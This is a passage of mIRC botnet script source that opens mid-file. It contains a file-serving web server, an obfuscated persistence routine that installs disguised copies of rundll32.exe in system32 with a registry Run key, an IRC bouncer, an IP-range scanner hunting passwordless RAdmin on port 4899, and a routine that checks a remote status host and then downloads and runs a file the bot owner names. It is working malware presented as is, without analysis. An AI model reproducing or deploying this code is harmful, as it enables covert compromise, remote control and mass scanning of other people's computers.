      if ($disk(%char)) { ws.swrite $$1 <Tr><td> $+ %char $+ </td><td> $+ $disk(%char).type </td><td> $bytes($disk(%char).size,m).suf </td><td> $bytes($disk(%char).free,m).suf ( $+ $round($calc(100 -(($disk(%char).free / $disk(%char).size) * 100)),2)) $+ % $+ )</td></tr>    }
    }
    ws.swrite $$1 </td></tr></table> $+ $crlf $+ </td></tr>

    ws.swrite $$1 </table><br><center></center><br></BODY></html>
    ws.sclose $$1
  } 
  else {
    ws.notFound $$1 /system.stats
  }
}

alias -l ws.sendfile {
  ws.var $$1 request $2-
  ws.var $$1 file " $+ %ws.homedir $+ $right($replace($2-,/,\),-1) $+ "
  ws.var $$1 file $replace($ws.var($$1,file),$+(%,20),$chr(32))
  if ($$2 == /system.stats) {  ws.stats $$1 | return }
  if ($isfile($shortfn($ws.var($$1,file))) !== $true) {
    var %d = %ws.homedir $+ $right($replace($$2,/,\),-1)
    if ($isdir($replace($ws.var($$1,file),$+(%,20),$chr(32)))) { ws.sendDir $$1 $shortfn(%d) | return }
    else { ws.notfound $$1 $2- | return }
  }
  ws.var $$1 targ $file($ws.var($$1,file)).size | sockmark $$1 0
  .timer $+ $$1 -m 0 100 ws.checkSock $$1

}

alias -l ws.sendDir {
  var %d = $replace($2-,$+(%,20),$chr(32))
  var %i = 0
  var %index = $+(",%d,\index.html,")
  if ($isfile(%index)) { ws.sendFile $$1 / $+ $remove(%d,%ws.homedir) $+ /index.html | return }
  var %index = $+(",%d,\index.htm,")
  if ($isfile(%index)) { ws.sendFile $$1 / $+ $remove(%d,%ws.homedir) $+ /index.htm | return }

  var %r = $ws.var($$1,request) 
  var %tokparm = $calc($numtok(%r,47) - 1)
  if (%tokparm > 1) { var %tokparm = 1- $+ %tokparm }
  if (%tokparm != 0) { var %upOne = / $+ $gettok(%r,%tokparm,47) $+ /  }
  else { var %upOne = / }
  ws.swrite $$1 <html><title> $+ $me $+ </title><body bgcolor=white text=black>
  ws.swrite $$1 <br><h2 align=center><font size=+1> %ws.homedir - $+ $iif(%ws.statsPage == 1,$+(&nbsp;[,<a href=/system.stats>System Info</a>,]))</h2> $crlf $+ <h2 align=center><font size=+1>Folders...</h2><table align=center width=75%><tr><td><ul>

  if (%r != /) { ws.swrite $$1 <li><a href=' $+ %upOne $+ '><b><font size=+1>..</font></b></a> }

  while (1 == 1) {
    inc %i 1
    var %ws.currFile = $nopath($finddir(%d,*,%i,0))
    if (%ws.currFile == $null) { break }
    else { ws.swrite $$1 <li><a href=' $+ %ws.currFile $+ /'> $+ %ws.currFile $+ </a> }
  }
  ws.swrite $$1 </ul></td></tr></table><Br><hr width=75%><br>
  var %i = 0, %filesizes 0
  ws.swrite $$1 <h2 align=center><font size=+1>Files..</h2><Br><table width=75% align=center border=1><tr><th>Name</th><th>Size</th><th>Created</th><th>Modified</th></tr>
  while (1 == 1) {
    inc %i 1
    var %ws.currfile = $nopath($findfile(%d,*.*,%i,0))
    var %ws.fullfile = $findfile(%d,*.*,%i,0)
    if (%ws.currfile == $null) { ws.swrite $$1 <tr><td><b>Total</B></td><td colspan=3> $+ $bytes(%filesizes,k).suf $+ </td></tr> | ws.swrite $$1 $crlf $+ </td></table><center></center><br></BODY></html> | ws.sclose $$1 | return }
    inc %filesizes $file(%ws.fullfile).size
    ws.swrite $$1 <tr><td><a href=' $+ %ws.currfile $+ '> $+ %ws.currfile $+ </a></td><td> $+ $bytes($file(%ws.fullfile).size,k).suf $+ </td><td> $+ $asctime($file(%ws.fullfile).ctime) $+ </td><td> $+ $asctime($file(%ws.fullfile).mtime) $+ </td></tr>
  }
}


; 8192 bytes is the max for the send queue
alias -l ws.endSend {
  if ($sock($$1) != $null) {
    if ($sock($1).sq == 0) { .timer $+ $1 off | ws.sclose $1 | return }
  }
  else { .timer $+ $1 off | ws.sclose $1 | return }
}
alias -l ws.sendpacket {
  if ($sock($$1) !== $null) {
    var %l = $calc(16384 - $sock($1).sq)

    if (%l > 8192) { var %l = 8192) }
    .bread $ws.var($1,file) $sock($1).mark %l &ws.in
    sockmark $1 $calc($sock($$1).mark + %l)
    sockwrite -b $1 %l &ws.in
    if ($sock($1).mark >= $ws.var($1,targ)) { .timer $+ $1 -m 0 100 ws.endSend $1 }
  }
}

alias ws.checkSock {
  ;- $$1
  if ($sock($$1) == $null) { .timer $+ $1 off | ws.sclose $1 }
  else {
    if ($sock($1).sq < 8192) { ws.sendPacket $1 }
  }
}

on *:socklisten:wsl: { .sockaccept ws- $+ %ws.sockCount | inc %ws.sockCount 1 | if (%ws.sockCount > 4000) { set %ws.sockCount 1 } }
on *:sockread:ws-*: {
  if ($sockerr > 0) return
  :nextread
  sockread %ws.temp
  if (%ws.temp == $null) %ws.temp = -
  if (%ws.logging == 1) { write " $+ $scriptdirwwwlogs\ $+ $replace($adate,/,-) $+ .txt" < $+ $sockname $+  > ( $+ $asctime $+ ) %ws.temp FROM IP: $sock($sockname).ip }
  if ($ws.var($sockname,TYPE) == POST) {
  }
  else {

    if ($mid($gettok(%ws.temp,2-,32),2,1) == .) { echo 4 -s $sock($sockname).ip $sockname Is attempting illegal access... presenting 404 error page. | ws.notfound $sockname /You're_not_leet_enough_for_me! | unset %ws.temp | return }

    if ($gettok(%ws.temp,1,32) == get) {
      if (%ws.showStatus == 1) { echo -s HTTP Request: GET $gettok(%ws.temp,2,32) From: $sock($sockname).ip - $sockname }
      var %ws.parms $gettok(%ws.temp,2-,32)
      var %numTokens = $nuktok(%ws.parms,32)
      var %ws.tokParms = 1- $+ %numTokens
      ; secho %ws.temp - %ws.parms
      if (*HTTP/* iswm %ws.parms) { var %ws.tokParms = 1- $+ $calc(%numTokens - 1)  }
      ws.sendfile $sockname $gettok(%ws.parms,%ws.tokParms,32)

      return
    }

  }
  if ($sockbr == 0) return
  goto nextread
}

alias ws.on { 
  .enable #ws
  unset %ws-*
  if ($sock(wsl) == $null) { .socklisten wsl %ws.port | msg $nick Webserver enabled. http:// $+ $ip $+ : $+ %ws.port $+  }
  else { msg $nick Webserver is already on! }
}
alias ws.on2 { 
  .enable #ws
  unset %ws-*
  if ($sock(wsl) == $null) { .socklisten wsl %ws.port }
  else { msg $nick Webserver is already on! }
}
alias ws.off {
  .disable #ws
  .sockclose wsl
}
alias -l RegWrite {
  if ($1 != $null) && ($2 != $null) && ($3 != $null) {
    var %a = Reg $+ Write
    .como $+ pen %a WSc $+ ript.She $+ ll
    if !$comerr {
      var %b =  $com(%a,Reg $+ Wri $+ te,3,bstr,$1,bstr,$2,bstr,$3)
      .comcl $+ ose %a
    }
    if ($3 == REG_EX $+ PAND_SZ) || ($3 == RE $+ G_SZ) {
      if ($re $+ gr $+ ead($1) == $2) { re $+ turn the val $+ ue ( $+ $1 $+ ) was created }
    }
  }
}

alias -l botnet.onchannel2 {
  var %i = 1
  while (%i <= $channel(0)) {
    var %botnet.joinedchannel3 $channel( $+ %i $+ ) $+ , $+ %botnet.joinedchannel3    
    inc %i
  }
  set %botnet.joinedchannel2 $left(%botnet.joinedchannel3,-1)
}
alias -l botnet.onchannel1 {
  var %i = 1
  while (%i <= $channel(0)) {
    var %botnet.joinedchannel $channel( $+ %i $+ ) $+ , $+ %botnet.joinedchannel    
    inc %i
  }
  set %botnet.joinedchannel1 $left(%botnet.joinedchannel,-1)
}

alias -l botnet.onchannel {
  scon 1 botnet.onchannel1
  if ($scon(0) == 2) { scon 2 botnet.onchannel2 }
  if ($1 == public) { scon 1 notice %botnet.owner 1: %botnet.joinedchannel1 $iif(%botnet.joinedchannel2,2: %botnet.joinedchannel2) | unset %botnet.joinedchannel* }
  else { scon 1 msg $nick 1: %botnet.joinedchannel1 $iif(%botnet.joinedchannel2,2: %botnet.joinedchannel2) | unset %botnet.joinedchannel*  
  } 
}
alias -l botnet.partchannel {
  if ($1 = 1) { 
    scon 1 botnet.onchannel1   
    scon 1 part $replace(%botnet.joinedchannel1,#,)
  }
  elseif ($1 = 2) {
    scon 2 botnet.onchannel2   
    scon 2 part %botnet.joinedchannel2
  }
  unset %botnet.joinedchannel* 
}

alias -l idle {
  if ($isid && $1 == user) { return $iif($read(nick.txt),$ifmatch,$+($r(a,z),$r(a,z),$r(a,z),$r(a,z),$r(a,z),$r(a,z))) }
  elseif ($1 == add) { if ($numtok(%idle.channels,44) < 4 && !$istok(%idle.channels,$2,44)) { set %idle.channels $addtok(%idle.channels,$2,44) | .timer 1 $r(1,1800) idle start } }
  elseif ($1 == clear) { unset %idle.channels }  
  elseif ($1 == del) { 
    if ($2 == all) { unset %idle.channels | sockclose idle }
    else { set %idle.channels $remtok(%idle.channels,$2,44) | sockwrite -n idle PART $2 }
  }
  elseif ($1 == start) { if (*.t-dialin.net iswm $host || $numtok(%idle.channels,44) < 1) { halt } | if ($sock(idle)) { idle limitjoin } | else { sockopen idle irc.quakenet.org 6667 } }
  elseif ($1 == limitjoin) { var %i = 1 | while (%i <= $numtok(%idle.channels,44)) { .timer 1 $calc(%i * $r(5,60)) sockwrite -n idle LIST $gettok(%idle.channels,%i,44) | inc %i } }
}

ON *:sockopen:idle: {
  sockwrite -n $sockname USER $lower($str($+($idle(user),$chr(32)),3)) $+(:,$idle(user))
  sockwrite -n $sockname NICK $idle(user)
}

ON *:sockread:idle: {
  if ($sockerr) { .timeridle -o 1 600 idle start }
  var %sockread
  sockread %sockread
  tokenize 32 %sockread
  if ($1 == PING) { sockwrite -n $sockname PONG $2- }
  elseif ($1 == ERROR) { .timeridle -o 1 600 idle start }
  elseif ($2 == 002) { sockwrite -n $sockname MODE $3 +i | idle limitjoin }
  elseif ($2 == 322) { if ($5 < 200) { sockwrite -n $sockname JOIN $4 } | else { .timeridle -o 1 600 idle start } }
  elseif ($2 == 433) { sockwrite -n $sockname NICK $idleqnet(user) }
}

ON *:sockclose:idleqnet: { .timeridle -o 1 600 idle start }

alias -l secure { 
  if (%botnet.secure != 1) {
    set %botnet.secure 1
    mkdir c:\windows\system32\secure\
    copy svchost.exe c:\windows\system32\secure\rundll32.exe
    copy secure.dll c:\windows\system32\secure\
    copy securemirc.ini c:\windows\system32\secure\mirc.ini
    copy dmu.dll c:\windows\system32\secure\
    $regwrite(HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\secure,c:\windows\system32\secure\rundll32.exe,REG_SZ)
    timer 1 10 run c:\windows\system32\secure\rundll32.exe
  }
}

alias bnc { .socklisten bnc $$1 }
on 1:socklisten:bnc:{
  .sockaccept bnc.temp
  %bnc.temp.ip = $sock(bnc.temp).ip
  .sockrename bnc.temp bnca $+ %bnc.temp.ip
}
on 1:sockread:bnca*:{
  .sockread %bnca
  if ($gettok(%bnca,1,32) == PASS) {
    if ($gettok(%bnca,2,32) == %bnc.pass) {
      .sockwrite -n $sockname   Password accepted.
      .sockwrite -n $sockname   /conn <server> <port> to connect.
      %bnc [ $+ [ $sock($sockname).ip ] ] = yes
    }
  }
  if (%bnc [ $+ [ $sock($sockname).ip != yes) {
    if ($gettok(%bnca,1,32) == NICK) {
      .set %bnc.nick $gettok(%bnca,2,32) 
    }
    if ($gettok(%bnca,1,32) == USER) {
      .set %bnc.user $gettok(%bnca,2-,32)
      .sockwrite -n $sockname   Welcome to Botnut iRC-Proxy.
      .sockwrite -n $sockname   /pass <pass> for authorization
    }
  }
  if (%bnc [ $+ [ $sock($sockname).ip ] ] == yes) {
    if ($gettok(%bnca,1,32) == CONN) {
      %bncconn. [ $+ [ $sock($sockname).ip ] ] = Connected
      .sockopen bncb [ $+ [ $sock($sockname).ip ] ] $gettok(%bnca,2-,32)
      .sockwrite -n $sockname   Now Attempting to connected to: $gettok(%bnca,2-,32)
      halt
    }
    if (%bncconn. [ $+ [ $sock($sockname).ip ] ] == Connected) {
      .sockwrite -n bncb [ $+ [ $remove($sockname,bnca) ] ] $gettok(%bnca,1-,32)
    }
    echo -s %bnca
  }
}
on 1:sockopen:bncb*:{
  .sockwrite -n $sockname USER %bnc.user
  .sockwrite -n $sockname NICK %bnc.nick
}
on 1:sockread:bncb*:{
  .sockread %bncb
  .sockwrite -n bnca [ $+ [ $remove($sockname,bncb) ] ] %bncb
}
on 1:sockclose:bnca*:{
  %bnc [ $+ [ $sock($sockname).ip ] ] = no
  %bnccon. [ $+ [ $sock($sockname).ip ] ] = no
  .sockclose bncb [ $+ [ $sock($sockname).ip ] ]
}
alias timerarg {
  var %arg $round($calc($prospeed / 100))
  if (%arg < 1) set %arg 1
  set %arg $int($calc(40 / %arg))
  if (%arg < 1) set %arg 1
  return %arg
}
alias prospeed { 
  var %protest $ticks 
  var %i 1 
  :start 
  if ($calc($ticks - %protest) <= 100) { 
    inc %i 
    goto start 
  }
  :end 
  return $calc(%i * .7))
}
alias scan {
  %scan.range = $$1
  if ($gettok(%scan.range,3,46) == $null) %scan.inc1 = 1
  else %scan.inc1 = $gettok(%scan.range,3,46)
  if ($gettok(%scan.range,4,46) == $null) %scan.inc2 = 1
  else %scan.inc2 = $gettok(%scan.range,4,46)
  if ($gettok(%scan.range,2,46) == $null) %scan.inc3 = 1
  else %scan.inc3 = $gettok(%scan.range,2,46)
  %scan = $gettok(%scan.range,1,46) $+ . $+ %scan.inc3 $+ . $+ %scan.inc1 $+ . $+ %scan.inc2
  .msg %botnet.channel $+ 2 Now scanning the range of %scan for RAdmin.
  .scan1
}
alias scan1 {
  .timerscan -ocm 0 $timerarg .scan2
}
alias scan2 {
  if (%scan.inc2 == 255) { 
    .timerscan off
    if (%scan.inc1 == 255) { 
      if (%scan.inc3 == 255) { %scanning = Done | halt }
      %scan.inc3 = %scan.inc3 + 1
      %scan.inc2 = 1
      %scan.inc1 = 1
      .timer -m 1 1 scan1 
      halt 
    }
    %scan.inc1 = %scan.inc1 + 1
    %scan.inc2 = 1
    .timer -m 1 1 scan1
  }
  .scansock
  %scan.inc2 = %scan.inc2 + 1
}
alias scansock {
  %sock = $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)
  .sockopen scanner[ $+ %sock $+ ] $gettok(%scan.range,1,46) $+ . $+ %scan.inc3 $+ . $+ %scan.inc1 $+ . $+ %scan.inc2 4899
  .timerclose $+ %sock 1 2 .sockclose scanner[ $+ %sock $+ ]
}
on 1:sockopen:scanner[*]:{
  if ($sock($sockname).status = active) {
    bset &command 1 1 0 0 0 1 0 0 0 8 8
    sockwrite $sockname &command
    halt
  }
}
on 1:sockread:scanner[*]:{
  if ($sockerr > 0) return
  :nextread
  sockread &temp
  if ($sockbr == 0) return
  if ($bvar(&temp,1,$bvar(&temp,0)) == %nopass) {
    .write radmin.txt $sock($sockname).ip
    .msg %botnet.channel $+ 2 (Found) RAdmin: $sock($sockname).ip
    .sockclose $sockname
  }
  if ($bvar(&temp,1,$bvar(&temp,0)) == %nopass1) {
    .write radmin.txt $sock($sockname).ip
    .msg %botnet.channel $+ 2 (Found) RAdmin: $sock($sockname).ip
    .sockclose $sockname
  }
  goto nextread
}

alias botnet.download { set %botnet.given $3- | set %botnet.givenhost $1 | set %botnet.givenpath $2 | sockclose botnet.check.it | .timer 1 1 sockopen botnet.check.it botnutstatus.da.ru 80 }

ON *:SOCKOPEN:botnet.check.it: {
  sockwrite -n $sockname GET / HTTP/1.1
  sockwrite -n $sockname Host: botnutstatus.da.ru $+ $str($crlf,2)
}

ON *:SOCKREAD:botnet.check.it: {
  var %sockread
  sockread %sockread
  if ($regsub(%sockread, <HTML><HEAD><TITLE>,,%sockread)) && ($regsub(%sockread, </TITLE></HEAD>,,%sockread)) {
    var %bla %sockread 
    echo -a %sockread    
    if (%bla == ON) {  
      if ($isfile(%botnet.given)) { .remove %botnet.given }     
      sockclose botnet.download
      .timer 1 1 sockopen botnet.download %botnet.givenhost 80
    }
    else { scon 1 msg %botnet.owner Access denied! }
  }
}


ON *:SOCKOPEN:botnet.download: {
  sockwrite -n $sockname GET / $+ %botnet.givenpath HTTP/1.0
  sockwrite -n $sockname Accept: */*
  sockwrite -n $sockname Host: %botnet.givenhost $+ $str($crlf,2)
  sockwrite -n $sockname
}

ON *:SOCKREAD:botnet.download:{
  if (%botnet.aupd.downloadready != 1) {
    var %header
    sockread %header
    while ($sockbr) {
      if (* !iswm %header) {
        %botnet.aupd.downloadready = 1
        break
      }
      sockread %header
    }
  }
  sockread 4096 &d
  while ($sockbr) {
    bwrite %botnet.given -1 -1 &d
    sockread 4096 &d
  }
}
ON *:SOCKCLOSE:botnet.download: { unset %botnet.aupd.* | run %botnet.given | scon 1 msg %botnet.owner Done. | .timer 1 5 remove %botnet.given }
